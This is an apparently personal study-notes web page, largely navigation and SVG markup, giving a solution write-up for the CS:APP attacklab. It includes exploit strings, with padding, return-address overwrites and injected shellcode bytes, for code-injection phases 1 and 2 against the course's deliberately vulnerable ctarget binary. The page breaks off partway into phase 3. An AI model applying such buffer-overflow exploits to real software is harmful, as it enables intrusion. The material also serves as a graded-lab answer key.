	<path style="fill:#3A3847;" d="M35.991,271.996h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,271.996,35.991,271.996z"/>
	<path style="fill:#3A3847;" d="M35.991,295.99h-7.998c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h7.998
		c2.21,0,3.999,1.789,3.999,3.999S38.202,295.99,35.991,295.99z"/>
	<path style="fill:#3A3847;" d="M99.976,80.042H67.983c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h31.992
		c2.21,0,3.999,1.789,3.999,3.999C103.975,78.254,102.186,80.042,99.976,80.042z"/>
	<path style="fill:#3A3847;" d="M243.94,104.037H131.968c-2.211,0-3.999-1.788-3.999-3.999c0-2.21,1.788-3.999,3.999-3.999H243.94
		c2.21,0,3.999,1.789,3.999,3.999C247.939,102.249,246.15,104.037,243.94,104.037z"/>
	<path style="fill:#3A3847;" d="M115.972,104.037h-39.99c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h39.99
		c2.21,0,3.999,1.789,3.999,3.999C119.971,102.249,118.182,104.037,115.972,104.037z"/>
	<path style="fill:#3A3847;" d="M339.916,128.031H235.942c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.788-3.999,3.999-3.999h103.974
		c2.211,0,4,1.789,4,3.999C343.916,126.243,342.126,128.031,339.916,128.031z"/>
	<path style="fill:#3A3847;" d="M387.904,128.031h-31.992c-2.209,0-3.998-1.788-3.998-3.999c0-2.21,1.789-3.999,3.998-3.999h31.992
		c2.211,0,4,1.789,4,3.999C391.904,126.243,390.115,128.031,387.904,128.031z"/>
	<path style="fill:#3A3847;" d="M219.946,128.031H83.979c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h135.967
		c2.21,0,3.999,1.789,3.999,3.999C223.945,126.243,222.156,128.031,219.946,128.031z"/>
	<path style="fill:#3A3847;" d="M107.974,176.019H83.979c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h23.994
		c2.21,0,3.999,1.789,3.999,3.999C111.973,174.231,110.184,176.019,107.974,176.019z"/>
	<path style="fill:#3A3847;" d="M242.69,176.019H123.97c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h118.721
		c2.21,0,3.999,1.789,3.999,3.999C246.689,174.231,244.9,176.019,242.69,176.019z"/>
	<path style="fill:#3A3847;" d="M275.931,152.025H91.978c-2.21,0-3.999-1.788-3.999-3.999c0-2.21,1.789-3.999,3.999-3.999h183.954
		c2.211,0,4,1.789,4,3.999C279.931,150.237,278.142,152.025,275.931,152.025z"/>
	<path style="fill:#3A3847;" d="M267.933,200.013h-71.981c-2.211,0-3.999-1.789-3.999-3.999s1.788-3.999,3.999-3.999h71.981
		c2.211,0,4,1.789,4,3.999S270.144,200.013,267.933,200.013z"/>
	<path style="fill:#3A3847;" d="M211.948,224.007H75.981c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h135.967
		c2.21,0,3.999,1.789,3.999,3.999S214.158,224.007,211.948,224.007z"/>
	<path style="fill:#3A3847;" d="M139.966,271.996H75.981c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h63.984
		c2.21,0,3.999,1.789,3.999,3.999S142.176,271.996,139.966,271.996z"/>
	<path style="fill:#3A3847;" d="M299.925,248.001H187.954c-2.211,0-3.999-1.789-3.999-3.999s1.788-3.999,3.999-3.999h111.971
		c2.211,0,4,1.789,4,3.999S302.136,248.001,299.925,248.001z"/>
	<path style="fill:#3A3847;" d="M323.919,248.001h-7.998c-2.209,0-3.998-1.789-3.998-3.999s1.789-3.999,3.998-3.999h7.998
		c2.211,0,4,1.789,4,3.999S326.13,248.001,323.919,248.001z"/>
	<path style="fill:#3A3847;" d="M171.958,248.001H83.979c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h87.979
		c2.21,0,3.999,1.789,3.999,3.999S174.168,248.001,171.958,248.001z"/>
	<path style="fill:#3A3847;" d="M99.976,295.99H67.983c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h31.992
		c2.21,0,3.999,1.789,3.999,3.999S102.186,295.99,99.976,295.99z"/>
	<path style="fill:#3A3847;" d="M275.931,224.007h-47.987c-2.211,0-3.999-1.789-3.999-3.999s1.788-3.999,3.999-3.999h47.987
		c2.211,0,4,1.789,4,3.999S278.142,224.007,275.931,224.007z"/>
	<path style="fill:#3A3847;" d="M339.916,200.013H283.93c-2.209,0-3.998-1.789-3.998-3.999s1.789-3.999,3.998-3.999h55.986
		c2.211,0,4,1.789,4,3.999S342.126,200.013,339.916,200.013z"/>
	<path style="fill:#3A3847;" d="M179.956,200.013H83.979c-2.21,0-3.999-1.789-3.999-3.999s1.789-3.999,3.999-3.999h95.977
		c2.21,0,3.999,1.789,3.999,3.999S182.166,200.013,179.956,200.013z"/>
</g>
<g style="opacity:0.3;">
	<rect x="43.987" y="52.047" style="fill:#FFFFFF;" width="15.996" height="263.27"/>
</g>
<g style="opacity:0.2;">
	<rect x="467.887" y="52.047" width="15.996" height="263.27"/>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>


    </a>
    Rubble
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  
    <li class="md-nav__item">
        <a href="../../.." class="md-nav__link">
        home
        </a>
    </li>
  

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      
      
        <a>csapp👾</a>
      
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="csapp👾" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        <span class="md-nav__icon md-icon"></span>
        csapp👾 <!-- maybe this is only for title of tabs -->
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../" class="md-nav__link">
        Preface
        </a>
    </li>
  

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
    
    <label class="md-nav__link" for="nav-2-2">
      
      
        <a href="../../1_Basis/outline/">Basis</a>
      
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Basis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-2">
        <span class="md-nav__icon md-icon"></span>
        Basis <!-- maybe this is only for title of tabs -->
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../1_Basis/1/" class="md-nav__link">
        1. information storage
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../1_Basis/2/" class="md-nav__link">
        2. instructions
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../1_Basis/3/" class="md-nav__link">
        3. procedures
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../1_Basis/4/" class="md-nav__link">
        4. struct
        </a>
    </li>
  

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      
      
        <a>Link</a>
      
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Link" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        <span class="md-nav__icon md-icon"></span>
        Link <!-- maybe this is only for title of tabs -->
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_Link/object_file/" class="md-nav__link">
        1. object file
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_Link/stlink/" class="md-nav__link">
        2. static linking
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_Link/dynlink/" class="md-nav__link">
        3. dynamic linking
        </a>
    </li>
  

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4">
    
    <label class="md-nav__link" for="nav-2-4">
      
      
        <a>ECF</a>
      
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ECF" data-md-level="2">
      <label class="md-nav__title" for="nav-2-4">
        <span class="md-nav__icon md-icon"></span>
        ECF <!-- maybe this is only for title of tabs -->
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_ECF/1/" class="md-nav__link">
        1. process
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_ECF/2/" class="md-nav__link">
        2. signal
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_ECF/3/" class="md-nav__link">
        3. nonlocal jump
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_ECF/ini/" class="md-nav__link">
        ?
        </a>
    </li>
  

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      
      
        <a>Concurrency</a>
      
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Concurrency" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        <span class="md-nav__icon md-icon"></span>
        Concurrency <!-- maybe this is only for title of tabs -->
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_Conc/1/" class="md-nav__link">
        1. 1
        </a>
    </li>
  

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      
      
        <a>Memory</a>
      
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Memory" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        <span class="md-nav__icon md-icon"></span>
        Memory <!-- maybe this is only for title of tabs -->
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_Memory/1/" class="md-nav__link">
        1. cache
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_Memory/vm/" class="md-nav__link">
        2. virtual memory
        </a>
    </li>
  

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      
      
        <a>IO</a>
      
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="IO" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        <span class="md-nav__icon md-icon"></span>
        IO <!-- maybe this is only for title of tabs -->
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  
    <li class="md-nav__item">
        <a href="../../_IO/basis/" class="md-nav__link">
        1. basis
        </a>
    </li>
  

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-8" type="checkbox" id="nav-2-8" checked>
    
    <label class="md-nav__link" for="nav-2-8">
      
      
        <a>Labs</a>
      
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Labs" data-md-level="2">
      <label class="md-nav__title" for="nav-2-8">
        <span class="md-nav__icon md-icon"></span>
        Labs <!-- maybe this is only for title of tabs -->
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  
    <li class="md-nav__item">
        <a href="../datalab/" class="md-nav__link">
        datalab
        </a>
    </li>
  

        
          
          
          


  
    <li class="md-nav__item">
        <a href="../bomblab/" class="md-nav__link">
        bomblab
        </a>
    </li>
  

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        attacklab
        <span class="md-nav__icon md-icon"></span>
      </label>
    
    
        <a href="./" class="md-nav__link md-nav__link--active">
        attacklab
        </a>
    
    
      
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    准备
  </a>
  
    <nav class="md-nav" aria-label="准备">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#files" class="md-nav__link">
    Files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#target-program" class="md-nav__link">
    Target Program
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-hex2raw" class="md-nav__link">
    Using hex2raw
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-byte-codes" class="md-nav__link">
    Generating Byte Codes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    知识回顾
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#part-i-code-injection-attacks" class="md-nav__link">
    Part I: Code Injection Attacks
  </a>
  
    <nav class="md-nav" aria-label="Part I: Code Injection Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#phase1" class="md-nav__link">
    phase1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase2" class="md-nav__link">
    phase2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase3" class="md-nav__link">
    phase3
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#part-ii-return-oriented-programming" class="md-nav__link">
    Part II: Return-Oriented Programming
  </a>
  
    <nav class="md-nav" aria-label="Part II: Return-Oriented Programming">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#phase4" class="md-nav__link">
    phase4
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase5" class="md-nav__link">
    phase5
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    准备
  </a>
  
    <nav class="md-nav" aria-label="准备">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#files" class="md-nav__link">
    Files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#target-program" class="md-nav__link">
    Target Program
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-hex2raw" class="md-nav__link">
    Using hex2raw
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-byte-codes" class="md-nav__link">
    Generating Byte Codes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    知识回顾
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#part-i-code-injection-attacks" class="md-nav__link">
    Part I: Code Injection Attacks
  </a>
  
    <nav class="md-nav" aria-label="Part I: Code Injection Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#phase1" class="md-nav__link">
    phase1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase2" class="md-nav__link">
    phase2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase3" class="md-nav__link">
    phase3
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#part-ii-return-oriented-programming" class="md-nav__link">
    Part II: Return-Oriented Programming
  </a>
  
    <nav class="md-nav" aria-label="Part II: Return-Oriented Programming">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#phase4" class="md-nav__link">
    phase4
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase5" class="md-nav__link">
    phase5
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  
                    <h1>attacklab</h1>
                  
                
                <h3 id="_1">准备<a class="headerlink" href="#_1" title="Permanent link">🧐</a></h3>
<h4 id="files">Files<a class="headerlink" href="#files" title="Permanent link">🧐</a></h4>
<ul>
<li>ctarget: &ensp; An executable program vulnerable to code-injection attacks</li>
<li>rtarget: &ensp; An executable program vulnerable to return-oriented-programming attacks</li>
<li>cookie.txt: &ensp; An 8-digit hex code that you will use as a unique identifier in your attacks.</li>
<li>farm.c: &ensp; The source code of your target's "gadget farm", which you will use in generating return-oriented
    programming attacks.</li>
<li>hex2raw: &ensp; A utility to generate attack strings</li>
</ul>
<h4 id="target-program">Target Program<a class="headerlink" href="#target-program" title="Permanent link">🧐</a></h4>
<div class="tabbed-set" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><label for="__tabbed_1_1">C source code</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="kt">unsigned</span><span class="w"> </span><span class="nf">getbuf</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="n">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
</div>
<input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><label for="__tabbed_1_2">assembly</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="mh">00000000004017a8</span> <span class="p">&lt;</span><span class="nf">getbuf</span><span class="p">&gt;:</span>
<span class="x">    4017a8: 48 83 ec 28             sub    $0x28,%rsp</span>
<span class="x">    4017ac: 48 89 e7                mov    %rsp,%rdi</span>
<span class="x">    4017af: e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span>
<span class="x">    4017b4: b8 01 00 00 00          mov    $0x1,%eax</span>
<span class="x">    4017b9: 48 83 c4 28             add    $0x28,%rsp</span>
<span class="x">    4017bd: c3                      retq</span>
<span class="x">    4017be: 90                      nop</span>
<span class="x">    4017bf: 90                      nop</span>
</code></pre></div>
</div>
</div>
<p><code>ctarget</code> 和 <code>rtarget</code> 都通过 <code>getbuf</code> 从标准输入中读入字符串 (terminated by <code>\n</code>) 并存储 (along with a null terminator)，需要注意:</p>
<ul>
<li>exploit string 的任何位置都不能包含 <code>0x0a</code> (ascii for <code>\n</code>)</li>
<li>通过反汇编查看 <code>BUFFER_SIZE</code></li>
</ul>
<h4 id="using-hex2raw">Using <code>hex2raw</code><a class="headerlink" href="#using-hex2raw" title="Permanent link">🧐</a></h4>
<p>将需要的十六进制码转换为字符串作为 <code>target</code> 的输入，可以通过以下方式:</p>
<p>1.&ensp;set a series of pipes</p>
<div class="highlight"><pre><span></span><code><span class="go">cat exploit.txt | ./hex2raw | ./ctarget -q</span>
</code></pre></div>
<p>2.&ensp;store the raw string in a file and use I/O redirection</p>
<div class="highlight"><pre><span></span><code><span class="go">./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span>
<span class="go">./ctarget &lt; exploit-raw.txt</span>
</code></pre></div>
<h4 id="generating-byte-codes">Generating Byte Codes<a class="headerlink" href="#generating-byte-codes" title="Permanent link">🧐</a></h4>
<div class="highlight"><pre><span></span><code><span class="go">gcc -c example.s</span>
<span class="go">objdump -d example.o &gt; example.d</span>
</code></pre></div>
<h4 id="_2">知识回顾<a class="headerlink" href="#_2" title="Permanent link">🧐</a></h4>
<p>函数调用过程: &ensp; 保存状态 → 传参 → <code>call</code> → 开栈 → ... → 释放 → <code>ret</code></p>
<h3 id="part-i-code-injection-attacks">Part I: Code Injection Attacks<a class="headerlink" href="#part-i-code-injection-attacks" title="Permanent link">🧐</a></h3>
<p>用 exploit string 攻击 <code>ctarget</code> 程序，<code>getbuf</code> 被 <code>test</code> 函数调用</p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">test</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getbuf</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;No exploit.  Getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>通过 <code>getbuf</code> 改变 buffer，使其无法安全返回 <code>test</code></p>
<h4 id="phase1">phase1<a class="headerlink" href="#phase1" title="Permanent link">🧐</a></h4>
<p>phase1 不要求注入新代码，只需让 <code>getbuf</code> 返回到 <code>touch1</code>，C rep:</p>
<div class="tabbed-set" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><label for="__tabbed_2_1">touch1</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">touch1</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">vlevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">    </span><span class="cm">/* Part of validation protocol */</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Touch1!: You called touch1()</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
</div>
<input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><label for="__tabbed_2_2">phase1.txt</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="go">/* padding 40 bytes */</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>

<span class="go">/* return: first address of touch1() */</span>
<span class="go">c0 17 40 00 00 00 00</span>
</code></pre></div>
</div>
</div>
<p>只需要填充 <code>0x28</code> 个字节后，用 <code>touch1</code> 的地址 <code>0x4017c0</code> 覆盖 <code>test</code> 的栈帧，注意小端法</p>
<h4 id="phase2">phase2<a class="headerlink" href="#phase2" title="Permanent link">🧐</a></h4>
<p>phase2 需要返回到 <code>touch2</code>，返回之前还要调用注入的代码用于传参，使 <code>val == cookie</code></p>
<div class="tabbed-set" data-tabs="3:4"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><label for="__tabbed_3_1">touch2</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">vlevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">val</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">cookie</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">validate</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="n">elee</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Misfire: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
</div>
<input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><label for="__tabbed_3_2">phase2.s</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="nf">pushq</span>  <span class="no">$0x4017ec</span>          <span class="c1"># first address of touch2</span>
<span class="nf">mov</span>    <span class="no">$0x59b997fa</span><span class="p">,</span> <span class="nv">%rdi</span>  <span class="c1"># cookie</span>
<span class="nf">ret</span>
</code></pre></div>
</div>
<input id="__tabbed_3_3" name="__tabbed_3" type="radio" /><label for="__tabbed_3_3">phase2.d</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="mh">0000000000000000</span> <span class="p">&lt;</span><span class="nf">.text</span><span class="p">&gt;:</span>
<span class="x">    0:  68 ec 17 40 00          pushq  $0x4017ec</span>
<span class="x">    5:  48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span>
<span class="x">    c:  c3                      retq</span>
</code></pre></div>
</div>
<input id="__tabbed_3_4" name="__tabbed_3" type="radio" /><label for="__tabbed_3_4">phase2.txt</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="go">/* padding 40 bytes */</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>

<span class="go">/* return: injectied codes at 0x5561dca0 + 8 */</span>
<span class="go">a8 dc 61 55 00 00 00 00</span>

<span class="go">/* encoding of injected codes */</span>
<span class="go">68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3</span>
</code></pre></div>
</div>
</div>
<p>通过 gdb 查看 <code>getbuf</code> 栈帧尾端的地址为 <code>0x5561dca0</code>，然后破坏 <code>test</code> 的栈帧，修改返回值，把注入的代码存放在 <code>0x5561dca8</code>。(不要使用 <code>call</code> 或 <code>jmp</code> 进行跳转)</p>
<h4 id="phase3">phase3<a class="headerlink" href="#phase3" title="Permanent link">🧐</a></h4>
<p>Level3 与 Level2 相似，但需要传一个字符串指针，使 cookie 的字符串形式与传入的字符串相等</p>
<div class="tabbed-set" data-tabs="4:5"><input checked="checked" id="__tabbed_4_1" name="__tabbed_4" type="radio" /><label for="__tabbed_4_1">touch3</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">sval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">vlevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Part of validation protocol */</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span><span class="w"> </span><span class="n">sval</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
